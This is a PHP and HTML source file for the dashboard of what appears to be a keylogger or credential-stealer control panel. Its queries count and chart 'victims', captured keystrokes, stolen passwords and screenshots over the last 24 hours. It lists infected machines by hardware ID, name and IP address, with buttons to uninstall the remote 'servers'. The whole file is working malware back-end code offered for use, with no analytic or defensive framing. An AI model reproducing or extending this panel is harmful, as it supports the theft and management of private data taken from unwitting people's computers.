<?php
	$json_data = array(
		array( 'db' => 'id',  'dt' => 'id' ),
		array( 'db' => 'hwid',  'dt' => 'hwid' ),
		array( 'db' => 'pc_name',  'dt' => 'pc_name' ),
		array( 'db' => 'add_date',   'dt' => 'add_date' ),
		array( 'db' => 'ip_addres',   'dt' => 'ip_addres' ),
		array( 'db' => 'time',   'dt' => 'time' )
	);
	$str = urlencode(serialize($json_data));
	
	$stmt = $db->select('SELECT h.theHour, COUNT(distinct lTbl.log_id) AS key_count,
						COUNT(distinct  pTbl.password_id) AS pw_count,
						COUNT(distinct sTbl.screen_id) AS scr_count, 
						COUNT(distinct vTbl.id) AS victim_count
						FROM (SELECT 0 AS theHour
							  UNION ALL SELECT 1
							  UNION ALL SELECT 2
							  UNION ALL SELECT 3
							  UNION ALL SELECT 4
							  UNION ALL SELECT 5
							  UNION ALL SELECT 6
							  UNION ALL SELECT 7
							  UNION ALL SELECT 8
							  UNION ALL SELECT 9
							  UNION ALL SELECT 10
							  UNION ALL SELECT 11
							  UNION ALL SELECT 12
							  UNION ALL SELECT 13 
							  UNION ALL SELECT 14 
							  UNION ALL SELECT 15 
							  UNION ALL SELECT 16 
							  UNION ALL SELECT 17 
							  UNION ALL SELECT 18 
							  UNION ALL SELECT 19 
							  UNION ALL SELECT 20 
							  UNION ALL SELECT 21 
							  UNION ALL SELECT 22 
							  UNION ALL SELECT 23) as h 
						LEFT JOIN (SELECT logs.log_id, logs.server_time FROM logs WHERE logs.server_time > now() - INTERVAL 1 DAY) as lTbl ON h.theHour = HOUR(lTbl.server_time) 
						LEFT JOIN (SELECT passwords.password_id, passwords.server_time FROM passwords WHERE passwords.server_time > now() - INTERVAL 1 DAY) AS pTbl ON h.theHour = HOUR(pTbl.server_time) 
						LEFT JOIN (SELECT screens.screen_id, screens.server_time FROM screens WHERE screens.server_time > now() - INTERVAL 1 DAY) AS sTbl ON h.theHour = HOUR(sTbl.server_time) 
						LEFT JOIN (SELECT victims.id, victims.add_date FROM victims WHERE victims.add_date > now() - INTERVAL 1 DAY) AS vTbl ON h.theHour = HOUR(vTbl.add_date) 
						GROUP BY theHour
						ORDER BY theHour', array(), array());

	$chart_data = '';
	while($row = $stmt->fetch_array()){
		$chart_data .= "{ hour:'".$row["theHour"].":00', clients:".$row["victim_count"].", keystrokes:".$row["key_count"].", passwords:".$row["pw_count"].", screenshots:".$row["scr_count"]."}, ";
	}
	$chart_data = substr($chart_data, 0, -2);
?>
		<div id="page-wrapper">
            <div class="container-fluid">
                <div class="row bg-title">
                    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
                        <h4 class="page-title">Dashboard</h4>
                    </div>
                </div>
				
				<div class="row">
                    <div class="col-md-12 col-lg-12 col-sm-12">
                        <div class="white-box">
                            <div class="row row-in">
								<div class="col-lg-3 col-sm-6 row-in-br">
                                    <div class="col-in row">
                                        <div class="col-md-6 col-sm-6 col-xs-6"> <i data-icon="E" class="linea-icon linea-basic"></i>
                                            <h5 class="text-muted vb">Computers</h5>
                                        </div>
                                        <div class="col-md-6 col-sm-6 col-xs-6">
                                            <h3 class="counter text-right m-t-15 text-danger">
												<?php


												$stmt = $db->select('SELECT COUNT(DISTINCT(hwid)) AS victim_count FROM victims', array(), array());

												$count=0;

												$stmt = $stmt->fetch_assoc();

												$count = $stmt['victim_count'];

												echo $count;

												?>
											</h3>
                                        </div>
                                        <div class="col-md-12 col-sm-12 col-xs-12">
                                            <div class="progress">
                                                <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" style="width: 100%"> </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-3 col-sm-6 row-in-br  b-r-none">
                                    <div class="col-in row">
                                        <div class="col-md-6 col-sm-6 col-xs-6"> <i class="linea-icon linea-basic" data-icon="4"></i>
                                            <h5 class="text-muted vb">Keystrokes</h5>
                                        </div>
                                        <div class="col-md-6 col-sm-6 col-xs-6">
                                            <h3 class="counter text-right m-t-15 text-megna">
												<?php
												$stmt = $db->select('SELECT COUNT(log_id) AS log_count FROM logs', array(), array());

												$count=0;

												$stmt = $stmt->fetch_assoc();

												$count = $stmt['log_count'];

												echo $count . "\n";
												?>
											</h3>
                                        </div>
                                        <div class="col-md-12 col-sm-12 col-xs-12">
                                            <div class="progress">
                                                <div class="progress-bar progress-bar-megna" role="progressbar" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" style="width: 100%"> </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-3 col-sm-6 row-in-br">
                                    <div class="col-in row">
                                        <div class="col-md-6 col-sm-6 col-xs-6"> <i class="linea-icon linea-basic" data-icon="!"></i>
                                            <h5 class="text-muted vb">Passwords</h5>
                                        </div>
                                        <div class="col-md-6 col-sm-6 col-xs-6">
                                            <h3 class="counter text-right m-t-15 text-primary">
											<?php

												$stmt = $db->select('SELECT COUNT(password_id) AS password_count FROM passwords', array(), array());

												$count=0;
												$stmt = $stmt->fetch_assoc();
												$count = $stmt['password_count'];

												echo $count . "\n";

											?>
											</h3>
                                        </div>
                                        <div class="col-md-12 col-sm-12 col-xs-12">
                                            <div class="progress">
                                                <div class="progress-bar progress-bar-primary" role="progressbar" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" style="width: 100%"> </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-3 col-sm-6  b-0">
                                    <div class="col-in row">
                                        <div class="col-md-6 col-sm-6 col-xs-6"> <i class="linea-icon linea-basic" data-icon="]"></i>
                                            <h5 class="text-muted vb">Screenshots</h5>
                                        </div>
                                        <div class="col-md-6 col-sm-6 col-xs-6">
                                            <h3 class="counter text-right m-t-15 text-success">
											<?php
												$stmt = $db->select('SELECT COUNT(screen_id) AS screen_count FROM screens', array(), array());

												$count=0;
												$stmt = $stmt->fetch_assoc();
												$count = $stmt['screen_count'];

												echo $count . "\n";
											?>
											</h3>
                                        </div>
                                        <div class="col-md-12 col-sm-12 col-xs-12">
                                            <div class="progress">
                                                <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" style="width: 100%"> </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
							</div>
						</div>
					</div>
				</div>
				
				<div class="row">
					<div class="col-md-12 col-lg-12 col-sm-12">
						<div class="white-box">
							<h3 class="box-title m-b-0">Clients</h3>
                            <p class="text-muted m-b-30">You can see your clients and uninstall servers.</p>
							<div class="table-responsive">
								<style>
									.dt-buttons{margin-left: 10px;}
									.btn-danger-custom{background: #d9534f !important;background-color: #d9534f !important;border-color: #d9534f !important;}
									.btn-danger-custom:hover{background: #fff !important;background-color: #fff !important;border: 1px solid #999 !important;}
									.paginate_input{max-width: 50px;padding: 0 5px;}
									.dataTables_wrapper .dataTables_paginate .paginate_button{padding: 0.3em 0.5em;}
								</style>
                                <table class="table table-striped table-bordered table-hover dataTables-Computers" cellspacing="0" width="100%">
								<?php

									echo '
									<thead>
									';
									
									echo '
									<td></td>
									<td>ID</td>
									<th>HWID</th>
									<th>Machine Name</th>
									<th>Start Date</th>
									<th>Last IP</th>
									<th>Machine Time</th>
									<th>Action</th>

									</thead>
									';

								?>				 
                                </table>
							</div>
						</div>
					</div>
				</div>

				<div class="row">
					<div class="col-md-12 col-lg-12 col-sm-12">
						<div class="white-box">
							 <h3 class="box-title">Received within the last 24 hours</h3>
							 <ul class="list-inline text-right">
								<li>
                                    <h5><i class="fa fa-circle m-r-5" style="color: #fb9678;"></i>Computers</h5>
                                </li>
                                <li>
                                    <h5><i class="fa fa-circle m-r-5" style="color: #00bfc7;"></i>Keystrokes</h5>
                                </li>
                                <li>
                                    <h5><i class="fa fa-circle m-r-5" style="color: #9675ce;"></i>Passwords</h5>
                                </li>
                                <li>
                                    <h5><i class="fa fa-circle m-r-5" style="color: #00c292;"></i>Screenshots</h5>
                                </li>
                            </ul>
                            <div id="morris-chart-logs" style="height: 340px;"></div>
						</div>
					</div>
				</div>
			</div>
		</div>
		
		<script>
        $(document).ready(function() {
			
            var table = $('.dataTables-Computers').DataTable({
				"order": [[ 1, "desc" ]],
				"processing": true,
				"serverSide": true,
				"ajax": "scripts/process.php?table=victims&primary=id&clmns=<?php echo $str; ?>",
				'columnDefs': [
					 {
						'targets': 0,
						'checkboxes': {
						   'selectRow': true
						},
						defaultContent:""
					 }
				],
				'select': {
					 'style': 'multi'
				},
				"columns": [
							{ "data": "id" },
							{ "data": "id" },
							{ "data": "hwid" },
							{ "data": "pc_name" },
							{ "data": "add_date" },
							{ "data": "ip_addres" },
							{ "data": "time" },
							{ "data": null,
							 "render": function ( data, type, row ) {
								 return '<a href=delete.php?type=uninstall&id=' +data["id"]+' class="btn btn-outline btn-danger btn-sm" onclick="return confirm(\'Are you sure you want to delete this?\')">Uninstall</a>';
							 }
							}
				],
                dom: 'lBfrtip',
				"pagingType": "input",
				buttons: [
					{
						text: '<span class="glyphicon glyphicon-trash"></span>',
						className: 'btn btn-danger-custom',
						action: function ( e, dt, node, config ) {
							SelectedArray();
						}
					}
				]
            });
			$(table.table().container()).on('change', '.dt-checkboxes-select-all input[type="checkbox"]', function() {
				  if($(this).prop('indeterminate') || !$(this).prop('checked')) {
                        table.column(0).checkboxes.deselect();
                    } else {
                        table.column(0).checkboxes.select();
                    }
			});
			
			function SelectedArray(){
				if(confirm("Are you sure you want to delete selected records?")){
					var rows_selected = table.column(0).checkboxes.selected();
					$.get("delete.php", { 'type': 'uninstall', 'id[]' : rows_selected.join(',').split(',') });
					table.ajax.reload();
				}
			}
			
			Morris.Area({
				element: 'morris-chart-logs',
				parseTime: false,
				data: [<?php echo $chart_data; ?>],
				xkey: 'hour',
				ykeys: ['keystrokes', 'passwords', 'screenshots', 'clients'],
				labels: ['Keystrokes', 'Passwords', 'Screenshots', 'Computers'],
				pointSize: 4,
				fillOpacity: 0,
				pointStrokeColors:['#00bfc7', '#9675ce', '#00c292', '#fb9678'],
				behaveLikeLine: true,
				gridLineColor: '#e0e0e0',
				lineWidth: 1,
				hideHover: 'auto',
				lineColors: ['#00bfc7', '#9675ce', '#00c292', '#fb9678'],
				resize: true
				
			});
		});
		</script>